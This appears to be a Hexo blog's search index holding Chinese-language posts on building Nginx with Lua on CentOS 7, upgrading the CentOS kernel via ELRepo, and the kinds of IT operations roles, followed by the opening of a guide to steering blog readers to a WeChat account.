<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Centos7安装Nginx整合Lua</title>
    <url>/articles/c745ae1a.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Lua 是一种轻量小巧的脚本语言，用标准C语言编写并以源代码形式开放， 其设计目的是为了嵌入应用程序中，从而为应用程序提供灵活的扩展和定制功能。现在通常把lua迁入nginx中，根据lua脚本规则，强化nginx的能力。本文介绍在centos7中安装nginx整合lua。</p>
<a id="more"></a>



<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><strong>centos7</strong></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service <span class="comment">#停止firewall</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld.service <span class="comment">#禁止firewall开机启动</span></span><br></pre></td></tr></table></figure>

<h4 id="安装依赖环境"><a href="#安装依赖环境" class="headerlink" title="安装依赖环境"></a>安装依赖环境</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install yum-utils gcc zlib zlib-devel pcre-devel openssl openssl-devel wget</span><br></pre></td></tr></table></figure>

<h4 id="安装LuaJIT"><a href="#安装LuaJIT" class="headerlink" title="安装LuaJIT"></a>安装LuaJIT</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://luajit.org/download/LuaJIT-2.0.2.tar.gz</span><br><span class="line">tar -xvf LuaJIT-2.0.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> LuaJIT-2.0.2</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<h4 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h4><p><strong>下载ngx_devel_kit、lua-nginx-module、nginx</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/simpl/ngx_devel_kit/archive/v0.3.0.tar.gz</span><br><span class="line">wget https://github.com/openresty/lua-nginx-module/archive/v0.10.9rc7.tar.gz</span><br><span class="line">wget http://nginx.org/download/nginx-1.12.1.tar.gz </span><br><span class="line"><span class="comment">#注意下载后的压缩包没有文件名称，但是根据版本号能区分是哪个文件</span></span><br><span class="line">tar -xvf v0.3.0.tar.gz</span><br><span class="line">tar -xvf v0.10.9rc7.tar.gz</span><br><span class="line">tar -xvf nginx-1.12.1.tar.gz</span><br></pre></td></tr></table></figure>

<h4 id="编译Nginx"><a href="#编译Nginx" class="headerlink" title="编译Nginx"></a>编译Nginx</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx-1.12.1</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/nginx --add-module=../ngx_devel_kit-0.3.0 --add-module=../lua-nginx-module-0.10.9rc7  --with-http_ssl_module  --with-http_stub_status_module  --with-http_gzip_static_module</span><br></pre></td></tr></table></figure>

<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<h4 id="启动nginx"><a href="#启动nginx" class="headerlink" title="启动nginx"></a>启动nginx</h4><p>启动时会nginx可能会报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./nginx: error while loading shared libraries: libluajit-5.1.so.2: cannot open shared object file:</span><br></pre></td></tr></table></figure>

<p>原因是：找不到libluajit-5.1.so.2这个文件</p>
<p><strong>解决办法</strong></p>
<p>找到 libluajit-5.1.so.2,libluajit-5.1.so.2.0.2这两个文件复制到 对应的lib下<br>64位是 /usr/lib64<br>32位是 /usr/lib</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name libluajit-5.1.so.2</span><br></pre></td></tr></table></figure>

<p><img src="/articles/c745ae1a/1.png" alt></p>
<p>文件默认是安装在 /usr/local/lib/libluajit-5.1.so.2下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /usr/<span class="built_in">local</span>/lib/libluajit-5.1.so.2 /usr/lib64/</span><br><span class="line">cp /usr/<span class="built_in">local</span>/lib/libluajit-5.1.so.2.0.2 /usr/lib64</span><br></pre></td></tr></table></figure>

<p><strong>然后启动</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>在nginx安装目录下，修改nginx.conf文件</p>
<p>在Server代码块下添加如下代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location /hello&#123;</span><br><span class="line">        default_type <span class="string">'text/plain'</span>;</span><br><span class="line">        content_by_lua <span class="string">'ngx.say("hello,lua")'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/c745ae1a/2.png" alt></p>
<p><strong>配置生效</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -t</span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure>

<p><strong>浏览器访问</strong> </p>
<p>访问地址： <a href="http://xxx.xxx.xxx/hello" target="_blank" rel="noopener">http://xxx.xxx.xxx/hello</a></p>
<p><img src="/articles/c745ae1a/3.png" alt></p>
<p>到此就成功了。</p>
<h2 id="添加服务"><a href="#添加服务" class="headerlink" title="添加服务"></a>添加服务</h2><p>这时nginx只能用绝对路径启动，测试和重载，非常不方便。那需要把nginx添加到linux的服务管理中。</p>
<p><strong>编写nginx.service文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=nginx</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/local/nginx/sbin/nginx</span><br><span class="line">ExecReload=/usr/local/nginx/sbin/nginx -s reload</span><br><span class="line">ExecStop=/usr/local/nginx/sbin/nginx -s quit</span><br><span class="line">PrivateTmp=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p><strong>添加</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp ./nginx.service /lib/systemd/system/</span><br></pre></td></tr></table></figure>

<p><strong>重新加载</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<p><strong>验证</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start nginx.service</span><br><span class="line">systemctl status nginx.service</span><br><span class="line">systemctl <span class="built_in">enable</span> nginx.service</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web服务</category>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>使用ELRepo第三方源为CentOS 6/7/8升级最新内核版本</title>
    <url>/articles/a6119320.html</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>Linux实质上上特指内核的，不过我们现在通常所说的是Linux是各个公司在内核的基础上进行优化和封装了很多组件，并加入了软件包管理工具等发行版，如：ubuntu，redhat,  centos等等。linux内核一直有在维护并随着技术和硬件的不断更新也加入了很多功能，所以如果要研究新的技术，用到新内核的功能，可能旧的内核不能满足需求。这时候就需要升级内核，但升级内核属于高危操作，早期还会总是出问题，后来如CentOS或RHEL类的Linux发行版需要升级Linux内核的话可以使用<a href="http://elrepo.org/" target="_blank" rel="noopener">ELRepo</a>第三方源来很方便进行升级。但是也可能受限于系统本身的低版本会造成升级失败，所以就详细描述了内核的升级过程。</p>
<p><img src="/articles/a6119320/1.jpg" alt></p>
<a id="more"></a>

<h1 id="ELRepo源"><a href="#ELRepo源" class="headerlink" title="ELRepo源"></a>ELRepo源</h1><p><a href="https://www.elrepo.org/" target="_blank" rel="noopener">ELRepo</a> 仓库，该软件源包含文件系统驱动以及网络摄像头驱动程序等等（支持显卡、网卡、声音设备甚至<a href="https://linux.cn/article-8310-1.html" target="_blank" rel="noopener">新内核</a>），虽然 ELRepo 是第三方仓库，但它有一个活跃社区和良好技术支持，并且CentOS官网wiki也已将它列为是可靠的（<a href="https://wiki.centos.org/AdditionalResources/Repositories" target="_blank" rel="noopener">参见此处</a>）。所以可以放心使用。</p>
<p><strong>内核版本简写说明</strong></p>
<p><strong>kernel-lt</strong>（lt=long-term）长期有效</p>
<p><strong>kernel-ml</strong>（ml=mainline）主流版本</p>
<h1 id="查看当前内核版本"><a href="#查看当前内核版本" class="headerlink" title="查看当前内核版本"></a>查看当前内核版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure>

<p>目前Linux内核发布的最新稳定版可以从 <a href="https://www.kernel.org" target="_blank" rel="noopener">https://www.kernel.org</a> 进行查看。</p>
<p><img src="/articles/a6119320/1.png" alt></p>
<h1 id="升级内核"><a href="#升级内核" class="headerlink" title="升级内核"></a>升级内核</h1><h2 id="先更新nss"><a href="#先更新nss" class="headerlink" title="先更新nss"></a>先更新nss</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum update nss</span><br></pre></td></tr></table></figure>

<h2 id="自动从源中安装"><a href="#自动从源中安装" class="headerlink" title="自动从源中安装"></a>自动从源中安装</h2><h4 id="首先安装ELRepo源"><a href="#首先安装ELRepo源" class="headerlink" title="首先安装ELRepo源"></a>首先安装ELRepo源</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos6</span></span><br><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line">rpm -Uvh https://www.elrepo.org/elrepo-release-6-9.el6.elrepo.noarch.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment">#centos7</span></span><br><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line">rpm -Uvh https://www.elrepo.org/elrepo-release-7.0-4.el7.elrepo.noarch.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment">#centos8</span></span><br><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line">rpm -Uvh https://www.elrepo.org/elrepo-release-8.0-2.el8.elrepo.noarch.rpm</span><br></pre></td></tr></table></figure>

<h4 id="启用ELRepo源仓库"><a href="#启用ELRepo源仓库" class="headerlink" title="启用ELRepo源仓库"></a><strong>启用ELRepo源仓库</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum --disablerepo=<span class="string">"\*"</span> --enablerepo=<span class="string">"elrepo-kernel"</span> list available</span><br></pre></td></tr></table></figure>

<h4 id="安装新内核"><a href="#安装新内核" class="headerlink" title="安装新内核"></a><strong>安装新内核</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y --enablerepo=elrepo-kernel install kernel<span class="_">-lt</span> kernel<span class="_">-lt</span>-devel  kernel<span class="_">-lt</span>-doc  kernel<span class="_">-lt</span>-headers</span><br></pre></td></tr></table></figure>

<p>如果顺利不报错的话新内核就说明已经安装完成。</p>
<h2 id="手动下载安装"><a href="#手动下载安装" class="headerlink" title="手动下载安装"></a>手动下载安装</h2><h4 id="内核报错"><a href="#内核报错" class="headerlink" title="内核报错"></a>内核报错</h4><p>如安装内核有报错：No package kernel-lt available. 如下图</p>
<p><img src="/articles/a6119320/3.png" alt></p>
<p>新内核下载地址：<a href="https://elrepo.org/linux/kernel/el7/x86_64/RPMS/" target="_blank" rel="noopener">https://elrepo.org/linux/kernel/el7/x86_64/RPMS/</a></p>
<h4 id="下载安装内核"><a href="#下载安装内核" class="headerlink" title="下载安装内核"></a>下载安装内核</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://elrepo.org/linux/kernel/el6/x86_64/RPMS/kernel<span class="_">-lt</span>-4.4.207-1.el6.elrepo.x86_64.rpm</span><br><span class="line">rpm -ivh kernel<span class="_">-lt</span>-4.4.207-1.el6.elrepo.x86_64.rpm</span><br></pre></td></tr></table></figure>

<h4 id="更新kernel-lt-headers"><a href="#更新kernel-lt-headers" class="headerlink" title="更新kernel-lt-headers"></a>更新kernel-lt-headers</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://elrepo.org/linux/kernel/el6/x86_64/RPMS/kernel-lt-headers-4.4.207-1.el6.elrepo.x86_64.rpm</span><br><span class="line">rpm -ivh kernel-lt-headers-4.4.207-1.el6.elrepo.x86_64.rpm</span><br></pre></td></tr></table></figure>

<p> 安装kernel-lt-headers时有冲突报错</p>
<p><img src="/articles/a6119320/4.png" alt></p>
<p><strong>排除报错</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#移除</span></span><br><span class="line">yum remove kernel-headers</span><br><span class="line"><span class="comment">#再重新安装</span></span><br><span class="line">rpm -ivh kernel<span class="_">-lt</span>-headers-4.4.207-1.el6.elrepo.x86_64.rpm</span><br></pre></td></tr></table></figure>

<h4 id="更新kernel-lt-devel"><a href="#更新kernel-lt-devel" class="headerlink" title="更新kernel-lt-devel"></a>更新kernel-lt-devel</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://elrepo.org/linux/kernel/el6/x86_64/RPMS/kernel-lt-devel-4.4.207-1.el6.elrepo.x86_64.rpm</span><br><span class="line">rpm -ivh kernel-lt-devel-4.4.207-1.el6.elrepo.x86_64.rpm</span><br></pre></td></tr></table></figure>

<h4 id="更新kernel-lt-doc"><a href="#更新kernel-lt-doc" class="headerlink" title="更新kernel-lt-doc"></a>更新kernel-lt-doc</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://elrepo.org/linux/kernel/el6/x86_64/RPMS/kernel-lt-doc-4.4.207-1.el6.elrepo.noarch.rpm</span><br><span class="line">rpm -ivh kernel-lt-doc-4.4.207-1.el6.elrepo.noarch.rpm</span><br></pre></td></tr></table></figure>

<h1 id="修改grub配置"><a href="#修改grub配置" class="headerlink" title="修改grub配置"></a>修改grub配置</h1><p>这里因为系统差异原因，对centos7以上版本和centos6版本差异处理。</p>
<h4 id="centos7以上"><a href="#centos7以上" class="headerlink" title="centos7以上"></a>centos7以上</h4><h6 id="查看当前grub中内核版本列表"><a href="#查看当前grub中内核版本列表" class="headerlink" title="查看当前grub中内核版本列表"></a>查看当前grub中内核版本列表</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos7以上版本</span></span><br><span class="line">awk -F\<span class="string">' '</span><span class="variable">$1</span>==<span class="string">"menuentry "</span> &#123;<span class="built_in">print</span> i++ <span class="string">" : "</span> <span class="variable">$2</span>&#125;<span class="string">' /etc/grub2.cfg</span></span><br></pre></td></tr></table></figure>

<p>Centos7及以上版本会返回信息,可能如下：</p>
<p><img src="/articles/a6119320/5.png" alt></p>
<p>信息列表中：<strong>0</strong> 即为安装的新内核</p>
<h6 id="修改设置并生成新的grub配置文件"><a href="#修改设置并生成新的grub配置文件" class="headerlink" title="修改设置并生成新的grub配置文件"></a>修改设置并生成新的grub配置文件</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub2-set-default 0</span><br><span class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></pre></td></tr></table></figure>

<h4 id="Centos6"><a href="#Centos6" class="headerlink" title="Centos6"></a>Centos6</h4><h6 id="查看安装的内核版本"><a href="#查看安装的内核版本" class="headerlink" title="查看安装的内核版本"></a>查看安装的内核版本</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep -i kernel</span><br></pre></td></tr></table></figure>

<p><img src="/articles/a6119320/6.png" alt></p>
<h6 id="编辑配置"><a href="#编辑配置" class="headerlink" title="编辑配置"></a>编辑配置</h6><p>更改/etc/grub.conf文件中default的值,设定为<strong>0</strong>如下图：</p>
<p><img src="/articles/a6119320/2.png" alt></p>
<h1 id="重新启动"><a href="#重新启动" class="headerlink" title="重新启动"></a>重新启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>查看内核版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>运维职责和分类划分</title>
    <url>/articles/6aa3e89a.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>有同学看到标题就会说5年以上的技术大咖都傻傻分不清楚，那能成的上大咖？这还真是的，有朋友在BAT等互联网大厂里工作多年，是做技术开发的，在业务上技术很牛的，但是有次聊天时问到这个问题，傻傻分不清楚运维具体是干什么的？有哪些分类？这很正常，孔子曰：术业有专攻，如是而已。还有一些新人小白想要进入这个行业，但是很懵懂，在刚刚接触，心里就打退堂鼓了，害怕自己学不会搞不定弄不懂。那这里就为大家揭开这一职业的朦胧面纱。</p>
<p><img src="/articles/6aa3e89a/1.jpg" alt></p>
<a id="more"></a>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>何为运维？运维，从字面意思很好理解，运行维护。有可能你认为的运维是高大上，坐在高档写字楼里，敲敲电脑动动手指的，可能是风吹日晒走街串巷等等。</p>
<p><img src="/articles/6aa3e89a/3.jpg" alt></p>
<p><img src="/articles/6aa3e89a/2.jpg" alt></p>
<p>是的，这些都是运维，但是行业，分工以及内容都不同。总体来说大致可以分为两类：线上运维和线下运维。而互联网运维就属于线上运维，共享单车运维就是线下运维。这里我们聊得就是互联网运维。</p>
<h2 id="运维前景"><a href="#运维前景" class="headerlink" title="运维前景"></a>运维前景</h2><p>要说运维的前景还是很广阔的。可以这么说只要有互联网就会需要运维，试问下，现在的生活还能没有互联网吗？所以，就业前景还是可以的。就企业而言，运维属于技术职务，所以走的是P路线。什么是P路线呢？是互联网就个人职业规划的上升和晋级通道，P路线就是技术路线，M路线就是管理路线。分不同等级，逐级或跨级晋升，当然不能等级体现了你的能力高低。我们常常自嘲为“打杂的”，因为运维是技术支持部门，是为开发出产品后上线提供支持的，所以很多东西都需要懂。所以如果想要从事这个行业先有个心理准备。技术方面有两个维度：深度和广度。就运维而言，广度是第一要求，你不需要精，但是一定要知道。深度在根据自己的规划方向再深入研究。就广度来说，从网络，服务器，系统，环境，应用，监控，虚拟化，容器化，自动化，智能化等等，需要学的太多了。还有，有人说：“运维是吃青春饭的”，对也不对，对的是做技术的，年龄大了操作和思维等肯定不如年轻人，不对的是：看能力，能力比较牛，不可替代，无论年龄多大都有市场。就单纯的说运维晋升：初级，中级，高级，资深，架构师，CTO。少年，你做好准备了吗？</p>
<h2 id="运维分类"><a href="#运维分类" class="headerlink" title="运维分类"></a>运维分类</h2><p>有很多程序员都是宅男，单身，过年过节回家，亲戚朋友问到从事的职业被戏称为修电脑的。但是只要是从事技术的，哪怕是刚入行的小白，也能够了解清楚分类，工具等。一般程序员根据开发语言划分的，像：php，java, C++，Go等等，根据业务划分可分为：前端和后端。这些基本就可以涵盖所有了。而运维的分类是怎样的呢？问什么会让很多人傻傻分不清和懵懂呢？各自有哪些职责呢？按职责划分运维的分类大致可以分为应用运维，系统运维，运维研发，数据库运维和运维安全。如下图所示：</p>
<p><img src="/articles/6aa3e89a/sun.jpg" alt></p>
<p>那下面我们就逐个介绍下。</p>
<h2 id="应用运维"><a href="#应用运维" class="headerlink" title="应用运维"></a><strong>应用运维</strong></h2><p>应用运维也是大部分人所认知的运维，应用运维根据字面意思就可以知道是和应用维护的。主要负责线上服务的发布变更、服务健康状况监控、服务的容灾高可用和数据安全备份等工作。针对这些工作需要对服务进行巡检了解服务状况，服务出故障的应急处理和排查优化。下面详细的职责如下所述。</p>
<p><img src="/articles/6aa3e89a/timg.jpg" alt></p>
<p><strong>评审</strong></p>
<p>在产品研发阶段，参与产品设计评审，从运维的角度提出评审意见，使服务满足准入要求，尽快上线并预备高可用等方案。</p>
<p><strong>服务</strong></p>
<p>服务管理主要就是发布系统，制定线上业务的升级变更及回滚方案，并根据申请进行变更的实施。掌握所负责的服务及服务间的依赖关联关系中的各种资源。能够发现服务上的缺陷，及时通报并推进解决。制定服务的稳定性指标及准入标准方案，同时不断完善和优化程序和系统的功能、效率，提高运行质量，完善监控内容，提高报警准确度。在线上服务出现故障时，第一时间响应，对已知的故障能按流程进行通报并按预案执行，未知故障组织相关人员进行联合排障。</p>
<p><strong>资源</strong></p>
<p>对各个服务使用的服务器资产进行管理，梳理服务器资源实时状况、IDC数据中心分布情况、网络专线及带宽情况，能够合理使用服务器资源，根据不同服务的需求，分配不同配置的服务器，确保服务器资源的充分利用。</p>
<p><strong>巡检</strong></p>
<p>实时了解服务的运行状况，制定服务的例行排查点，并不断完善。并根据制定的服务排查点，对服务进行定期检查。对排查过程中发现的问题，及时进行追查处理，排除可能存在的隐患和痛点</p>
<p><strong>监控</strong></p>
<p>确定服务存活状态正常，对服务的各项性能、系统的指标阈值或临界点安排合理，以及对出现该异常后的处理制定预案。建立和更新和维护服务预案文档，并根据日常故障情况不断补充完善，提高预案完备性。周期性进行预案演练，确保预案的可行性。</p>
<p><strong>备份</strong></p>
<p>制定业务数据的备份方案，按策略对数据进行备份和冗余工作。保证数据备份的可用性，完整性和安全性，定期开展数据恢复性测试。</p>
<h2 id="系统运维"><a href="#系统运维" class="headerlink" title="系统运维"></a><strong>系统运维</strong></h2><p>系统运维主要和系统及底层网络等打交道，如：IDC机房、网络拓扑、CDN加速和基础服务的建设等；对所有服务器的资产进行管理，服务器的调研选型、交付上架和后期维护等。详细的工作职责如下：</p>
<p><img src="/articles/6aa3e89a/4.jpg" alt></p>
<p><strong>IDC机房</strong></p>
<p>根据业务申请需求，预估未来数据中心的发展规模，从骨干网络的分布，数据中心建筑可靠性，以及Internet的接入、网络中的攻击防御、扩容、空间预留、外接专线、现场支撑等方面。</p>
<p><strong>网络</strong></p>
<p>设计及规划生产网络架构，这里面包括：数据中心网络架构、传输网架构、CDN网络架构等，以及网络调优等日常运维工作。</p>
<p><strong>基础服务</strong></p>
<p>根据网络规模和业务需求，构建负载均衡集群，完成网络与业务服务器的衔接，提供高性能、高可用的负载调度能力，以及统一的网络层防御能力；通过集群化部署，保证公网访问服务的高性能与高可用。有些服务需要借助于第三方的，对第三方进行测试选型和调度控制，监控等等，保障系统稳定、高效运行。</p>
<p><strong>服务器</strong></p>
<p>服务器的测试和选型，包含服务器整机、部件的基础性测试和业务压力测试，降低整机功率，规划服务器上架位置，在保证温湿度的情况下，提升部署密度，降低成本；服务器硬件故障的诊断排查和定位，服务器温湿度转速等硬件监控等；</p>
<p><strong>操作系统</strong></p>
<p>所有平台的操作系统选型、定制和内核优化，以及漏洞补丁的更新和内部版本升级；建立统一的软件包管理和分发中心库，以及现在用的很多的maven依赖包仓库和Docker容器仓库；</p>
<p><strong>资产管理</strong></p>
<p>记录和管理所有基础物理信息，包括IDC数据中心、网络信息、机架机柜位置、服务器型号信息，售后信息等等各种资源信息，制定有效合理的流程，确保信息的准确性；</p>
<h2 id="运维开发"><a href="#运维开发" class="headerlink" title="运维开发"></a><strong>运维开发</strong></h2><p>运维平台设计,开发和实施部署，如：用户管理，资产管理、监控系统、发布平台、权限管理系统等等。提供各种接口，封装更高层的自动化运维系统。详细的工作职责如下所述。</p>
<p><img src="/articles/6aa3e89a/5.jpg" alt></p>
<p><strong>发布平台</strong></p>
<p>记录关联关系，协助运维人员对日常运维标准化，流程化进而自动化，包括服务器的管理如：重启、改名、初始化、域名管理、流量切换和故障预案实施等。</p>
<p><strong>监控系统</strong></p>
<p>监控系统的调研选型，对服务器和各种网络设备的资源性能指标、业务性能指标的收集、告警、存储、分析、展示和数据分析等工作，保证公司服务器资源的合理化调配，持续提高告警的及时性、准确性和有效性，对监控进行聚合，进而实现智能化报警监控。</p>
<p><strong>自动化平台</strong></p>
<p>自动化系统的开发，自动化部署系统所需要的各种数据和信息。结合云计算，区块链等技术，研发和提供PaaS相关高可用平台，提高服务的部署有效性和稳定性，提高资源利用率。</p>
<h2 id="数据库运维"><a href="#数据库运维" class="headerlink" title="数据库运维"></a><strong>数据库运维</strong></h2><p>数据库运维需要对库、表、索引和SQL等制定规范，对数据库进行变更、监控、备份、高可用设计等工作。详细的工作职责如下所述。</p>
<p><img src="/articles/6aa3e89a/6.jpg" alt></p>
<p><strong>评审</strong></p>
<p>在产品研发阶段，参与设计方案评审，从DBA的角度提出数据存储、库表设计，索引设计等方案、SQL开发标准，使服务满足数据库的高可用、高性能要求。</p>
<p><strong>容量</strong></p>
<p>掌握所负责服务数据库的容量上限，清楚地了解瓶颈点，当服务将触及容量阈值时，及时优化、分拆或者扩容等</p>
<p><strong>备份与灾备</strong></p>
<p>制定数据备份与灾备策略方案，定期对数据进行恢复性测试，保证数据备份的有效性，可用性和完整性。</p>
<p><strong>监控</strong></p>
<p>对数据库存活和各项性能指标监控，及时了解数据库的运行状态。</p>
<p><strong>安全</strong></p>
<p>建立数据库账号和权限控制体系，有效降低误操作和数据泄露的风险；加强离线备份数据的管理，降低数据泄露的风险。</p>
<p><strong>性能优化</strong></p>
<p>对数据库风险点有备用或切换方案，降低故障对数据库的影响；对数据库性能进行优化，包括存储方案改进、硬件资源优化、文件系统优化、库表优化、SQL优化等。</p>
<p><strong>自动化</strong></p>
<p>开发数据库自动化平台，包括数据库部署、自动扩容、分库分表、权限管理、备份恢复、SQL审核和上线、故障处理等。</p>
<h2 id="运维安全"><a href="#运维安全" class="headerlink" title="运维安全"></a><strong>运维安全</strong></h2><p>运维安全负责各方面的安全加固工作，进行安全扫描、渗透测试，进行安全工具和系统研发以及安全事件应急处理。详细的工作职责如下所述。</p>
<p><img src="/articles/6aa3e89a/7.jpg" alt></p>
<p><strong>安全文档</strong></p>
<p>根据公司内部的具体流程，制定切实可行且行之有效的安全方案和制度。</p>
<p><strong>安全培训</strong></p>
<p>定期向员工提供具有安全培训和考核，在公司内建立安全负责人制度。</p>
<p><strong>风险评估</strong></p>
<p>通过黑白盒测试和检查机制，对网络、服务器、业务、用户数据等方面的风险评估。</p>
<p><strong>安全</strong></p>
<p>根据风险评估报告，加固薄弱环节，包括设计安全防线、部署安全设备、更新补丁、防御病毒、源代码自动扫描和业务产品安全咨询等等。通过加密、匿名化、混淆数据，乃至定期删除等技术手段和流程来降低可能泄露数据的风险。</p>
<p><strong>安全合规</strong></p>
<p>为了满足合规性要求例如金融牌照，支付牌照等，安全团队承担着对外安全合规的接口人角色。</p>
<p><strong>应急响应</strong></p>
<p>建立安全报警系统，通过安全中心收集第三方发现的安全问题，评估影响面，组织各部门对已经发现的安全问题进行修复和事后造成安全的追查。</p>
<p>运维工作的目标和期望是：希望所有的工作都自动化起来，减少人的重复工作，降低知识传递的成本，使我们的业务能够更高效、更安全运行，使产品运行的更加稳定。Good  Luck!!!</p>
]]></content>
      <categories>
        <category>心得体会</category>
      </categories>
      <tags>
        <tag>Experiences</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客导流到微信公众号</title>
    <url>/articles/36a9dafd.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>随着互联网的高速发展，我们身边的一切都发生了翻天覆地的变化，互联网真真正正改变了我们的生活方式。足不出户买东西，点点手机叫外卖，一部手机走天下等等。古有文人墨客怀才不遇，积愤难平。但现在互联网放大了每个人的能力，知识变现，粉丝导流，人气带货等等已很常见。这时很多技术博主或站长，就想技术文档笔记积累的人气导流到微信公众号。本文就是讲解Hexo博客导流到微信公众号的流程。一句话概括：就是Hexo 整合 OpenWrite 平台的 readmore 插件,实现博客的每一篇文章自动增加阅读更多效果,关注公众号后方可解锁全站文章,从而实现博客流量导流到微信公众号粉丝目的。</p>
<p>有些同学，会有如下疑问：</p>
<ul>
<li>为什么要讲Hexo博客，而不是其他如简书，博客园等？</li>
<li>导流后效果是怎样的呢？</li>
<li>配置会不会很麻烦呢？</li>
<li>需要用到哪些工具呢？</li>
<li>具体流程是怎样的呢？</li>
</ul>
<p>针对这些问题，下面就一一解答。</p>
<a id="more"></a>



<h2 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h2><p>为什么要讲Hexo博客，而不是其他如简书，博客园等，或者自己建站呢？归根结底，还是因为Money问题。Hexo是github的静态pages博客，搭建好后不需要域名和服务器空间（这些虽然不贵，但是都是要钱的), 并且所有博客内的源码自己可控的。而且国内的云服务商都有静态pages功能，如码云和腾讯云等。重要的是需求就是：做个笔记，记录工作中遇到的技术，对自己做个总结，后面忘记时可以快速查询回忆起来。需求简单，源码可控等造成了hexo静态博客用处很广。</p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/articles/36a9dafd/1.png" alt></p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>hexo配置导流很简单的，主要用到工具就是<a href="https://openwrite.cn/" target="_blank" rel="noopener">OpenWrite</a>。</p>
<h4 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h4><p>web页面填写邮箱和密码注册openwrite。</p>
<p><img src="/articles/36a9dafd/2.png" alt></p>
<p><img src="/articles/36a9dafd/3.png" alt></p>
